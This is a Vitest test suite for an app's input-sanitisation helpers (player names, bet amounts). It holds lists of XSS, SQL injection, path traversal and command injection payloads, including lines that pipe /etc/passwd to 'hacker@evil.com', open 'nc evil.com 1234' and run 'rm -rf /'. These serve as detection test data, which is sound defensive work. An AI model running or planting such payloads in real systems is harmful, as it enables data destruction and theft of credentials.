import { describe, it, expect, beforeEach, vi } from 'vitest'
import {
  sanitizeHtml,
  sanitizeInput,
  PlayerNameSchema,
  BetAmountSchema,
  InputValidator,
  validateAndSanitizeInput,
  createValidator
} from '../utils/security'

/**
 * Comprehensive Security Test Suite
 * Tests all security utilities against various attack vectors
 */

describe('Security Test Suite - Comprehensive Coverage', () => {
  
  describe('XSS Attack Prevention', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)">',
      '<form><button formaction="javascript:alert(1)">',
      '<details open ontoggle="alert(1)">',
      '<marquee onstart="alert(1)">',
      '<video><source onerror="alert(1)">',
      '"><script>alert(1)</script>',
      '\';alert(1);//',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      '%3Cscript%3Ealert%281%29%3C%2Fscript%3E', // URL encoded
      '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML entities
    ]

    xssPayloads.forEach((payload, index) => {
      it(`should sanitize XSS payload ${index + 1}: ${payload.slice(0, 30)}...`, () => {
        const sanitized = sanitizeHtml(payload)
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toContain('onerror=')
        expect(sanitized).not.toContain('onload=')
        expect(sanitized).not.toContain('alert(')
        
        // Should detect as XSS
        expect(InputValidator.containsXSS(payload)).toBe(true)
      })
    })

    it('should preserve safe content while removing XSS', () => {
      const mixedContent = 'Hello <script>alert("xss")</script> World! This is safe content.'
      const sanitized = sanitizeHtml(mixedContent)
      
      expect(sanitized).toContain('Hello')
      expect(sanitized).toContain('World!')
      expect(sanitized).toContain('safe content')
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
    })
  })

  describe('SQL Injection Prevention', () => {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; INSERT INTO users VALUES('hacker', 'password'); --",
      "' UNION SELECT * FROM users --",
      "' OR SLEEP(5) --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR (SELECT user FROM mysql.user LIMIT 1)='root",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 50 --",
      "1' UNION SELECT null,@@version,null --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    ]

    sqlPayloads.forEach((payload, index) => {
      it(`should detect SQL injection payload ${index + 1}: ${payload.slice(0, 30)}...`, () => {
        expect(InputValidator.containsSQLInjection(payload)).toBe(true)
        
        // Should be caught by validation
        const result = validateAndSanitizeInput(payload, PlayerNameSchema)
        expect(result.success).toBe(false)
        expect(result.error).toContain('Security validation failed')
      })
    })

    it('should allow safe SQL-like content', () => {
      const safeContent = [
        "Player's Game",
        "User OR Team",
        "SELECT button color",
        "INSERT coin to play"
      ]

      safeContent.forEach(content => {
        expect(InputValidator.containsSQLInjection(content)).toBe(false)
      })
    })
  })

  describe('Command Injection Prevention', () => {
    const commandPayloads = [
      'test; rm -rf /',
      'test && curl evil.com',
      'test | nc evil.com 1234',
      '$(curl evil.com)',
      '`curl evil.com`',
      'test; cat /etc/passwd',
      'user & ping evil.com',
      'name || wget evil.com',
      '../../../etc/passwd',
      'test$(whoami)',
      'test`id`',
      'user; shutdown -h now',
      'name && cat /etc/shadow',
      'test | mail hacker@evil.com < /etc/passwd',
      'user; echo "hacked" > /tmp/hacked.txt',
    ]

    commandPayloads.forEach((payload, index) => {
      it(`should detect command injection payload ${index + 1}: ${payload.slice(0, 30)}...`, () => {
        expect(InputValidator.containsCommandInjection(payload)).toBe(true)
        
        // Should be caught by validation
        const result = validateAndSanitizeInput(payload, PlayerNameSchema)
        expect(result.success).toBe(false)
        expect(result.error).toContain('Security validation failed')
      })
    })
  })

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      '\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
      '..%252f..%252f..%252fetc%252fpasswd', // Double URL encoded
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', // Unicode encoded
      'file:///etc/passwd',
      '\\\\..\\\\..\\\\..\\\\etc\\\\passwd',
    ]

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should sanitize path traversal payload ${index + 1}: ${payload.slice(0, 30)}...`, () => {
        const sanitized = sanitizeInput(payload)
        
        // Should not contain path traversal sequences
        expect(sanitized).not.toMatch(/\.\.\//g)
        expect(sanitized).not.toMatch(/\.\.\\/g)
        expect(sanitized).not.toContain('/etc/')
        expect(sanitized).not.toContain('\\windows\\')
      })
    })
  })

  describe('Input Validation Edge Cases', () => {
    it('should handle extremely long inputs', () => {
      const longInput = 'a'.repeat(10000)
      const sanitized = sanitizeInput(longInput)
      
      expect(sanitized.length).toBeLessThanOrEqual(1000)
    })

    it('should handle unicode and special characters', () => {
      const unicodeInput = 'Player🎰💰🃏𝕏ℌ𝔞𝔠𝔨𝔢𝔯'
      const result = PlayerNameSchema.safeParse(unicodeInput)
      
      // Should reject non-ASCII characters in player names
      expect(result.success).toBe(false)
    })

    it('should handle null bytes and control characters', () => {
      const maliciousInput = 'player\x00\x01\x02\x03\x04\x05name'
      const sanitized = sanitizeInput(maliciousInput)
      
      expect(sanitized).not.toMatch(/[\x00-\x1F\x7F]/g)
      expect(sanitized).toBe('playername')
    })

    it('should handle mixed attack vectors', () => {
      const complexPayload = `
        <script>
          fetch('/api/users', {
            method: 'POST',
            body: JSON.stringify({
              name: "'; DROP TABLE users; --",
              command: "$(curl evil.com)"
            })
          })
        </script>
      `
      
      const securityCheck = InputValidator.validateSecurity(complexPayload)
      expect(securityCheck.safe).toBe(false)
      expect(securityCheck.threats).toContain('XSS')
      expect(securityCheck.threats).toContain('SQL Injection')
      expect(securityCheck.threats).toContain('Command Injection')
    })
  })

  describe('Schema Validation Security', () => {
    it('should validate bet amounts against manipulation', () => {
      const maliciousAmounts = [
        -1, // Negative
        1.5, // Decimal
        NaN, // Not a number
        Infinity, // Infinite
        Number.MAX_SAFE_INTEGER + 1, // Too large
        '100', // String
        null, // Null
        undefined, // Undefined
        { amount: 100 }, // Object
        [100], // Array
      ]

      maliciousAmounts.forEach(amount => {
        const result = BetAmountSchema.safeParse(amount)
        expect(result.success).toBe(false)
      })
    })

    it('should validate player names against various attacks', () => {
      const maliciousNames = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '$(rm -rf /)',
        '../../../etc/passwd',
        'a'.repeat(100), // Too long
        '', // Empty
        '   ', // Only whitespace
        'player@email.com', // Invalid characters
        'player#hashtag', // Invalid characters
        'player!exclamation', // Invalid characters
      ]

      maliciousNames.forEach(name => {
        const result = PlayerNameSchema.safeParse(name)
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Rate Limiting and DoS Prevention', () => {
    it('should limit input processing time', () => {
      const complexInput = 'a'.repeat(1000000) // 1MB string
      
      const startTime = performance.now()
      const sanitized = sanitizeInput(complexInput)
      const endTime = performance.now()
      
      // Should complete quickly (< 100ms for 1MB)
      expect(endTime - startTime).toBeLessThan(100)
      expect(sanitized.length).toBeLessThanOrEqual(1000)
    })

    it('should handle rapid validation requests', () => {
      const testInput = 'ValidPlayerName123'
      const iterations = 1000
      
      const startTime = performance.now()
      for (let i = 0; i < iterations; i++) {
        PlayerNameSchema.safeParse(testInput)
      }
      const endTime = performance.now()
      
      // Should handle 1000 validations quickly
      expect(endTime - startTime).toBeLessThan(1000) // < 1 second
    })
  })

  describe('Memory Safety', () => {
    it('should not leak memory with large inputs', () => {
      const initialMemory = process.memoryUsage().heapUsed
      
      // Process many large inputs
      for (let i = 0; i < 100; i++) {
        const largeInput = 'x'.repeat(10000)
        sanitizeInput(largeInput)
        PlayerNameSchema.safeParse('ValidName' + i)
      }
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc()
      }
      
      const finalMemory = process.memoryUsage().heapUsed
      const memoryIncrease = finalMemory - initialMemory
      
      // Memory increase should be reasonable (< 10MB)
      expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024)
    })
  })

  describe('Encoding and Escaping', () => {
    it('should handle various encoding schemes', () => {
      const encodedPayloads = [
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E', // URL encoded
        '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML entities
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode escaped
        '\x3cscript\x3ealert(1)\x3c/script\x3e', // Hex escaped
      ]

      encodedPayloads.forEach(payload => {
        const decoded = decodeURIComponent(payload).replace(/&lt;/g, '<').replace(/&gt;/g, '>')
        expect(InputValidator.containsXSS(decoded)).toBe(true)
      })
    })

    it('should preserve safe encoded content', () => {
      const safeEncoded = 'Hello%20World%21' // "Hello World!"
      const decoded = decodeURIComponent(safeEncoded)
      
      expect(InputValidator.validateSecurity(decoded).safe).toBe(true)
      expect(decoded).toBe('Hello World!')
    })
  })

  describe('Validator Factory Functions', () => {
    it('should create reusable validators', () => {
      const nameValidator = createValidator(PlayerNameSchema)
      const amountValidator = createValidator(BetAmountSchema)
      
      // Test name validator
      expect(nameValidator('Player123').success).toBe(true)
      expect(nameValidator('<script>').success).toBe(false)
      
      // Test amount validator
      expect(amountValidator(100).success).toBe(true)
      expect(amountValidator(-1).success).toBe(false)
    })

    it('should handle validator composition', () => {
      const inputs = [
        { name: 'Player123', amount: 100 },
        { name: '<script>', amount: 100 },
        { name: 'Player123', amount: -1 },
        { name: '', amount: NaN },
      ]

      inputs.forEach(input => {
        const nameResult = validateAndSanitizeInput(input.name, PlayerNameSchema)
        const amountResult = validateAndSanitizeInput(input.amount, BetAmountSchema)
        
        const isValid = nameResult.success && amountResult.success
        expect(typeof isValid).toBe('boolean')
      })
    })
  })
})

/**
 * Performance benchmarks for security functions
 */
describe('Security Performance Benchmarks', () => {
  const BENCHMARK_ITERATIONS = 1000
  const PERFORMANCE_THRESHOLD = 1000 // 1 second for 1000 operations

  it('should perform input sanitization within performance threshold', () => {
    const testInput = 'Player123<script>alert("test")</script>Test'
    
    const startTime = performance.now()
    for (let i = 0; i < BENCHMARK_ITERATIONS; i++) {
      sanitizeInput(testInput)
    }
    const endTime = performance.now()
    
    expect(endTime - startTime).toBeLessThan(PERFORMANCE_THRESHOLD)
  })

  it('should perform schema validation within performance threshold', () => {
    const testName = 'Player123'
    
    const startTime = performance.now()
    for (let i = 0; i < BENCHMARK_ITERATIONS; i++) {
      PlayerNameSchema.safeParse(testName)
    }
    const endTime = performance.now()
    
    expect(endTime - startTime).toBeLessThan(PERFORMANCE_THRESHOLD)
  })

  it('should perform security validation within performance threshold', () => {
    const testInput = 'Player with some <script> and SQL injection attempts'
    
    const startTime = performance.now()
    for (let i = 0; i < BENCHMARK_ITERATIONS; i++) {
      InputValidator.validateSecurity(testInput)
    }
    const endTime = performance.now()
    
    expect(endTime - startTime).toBeLessThan(PERFORMANCE_THRESHOLD)
  })
})
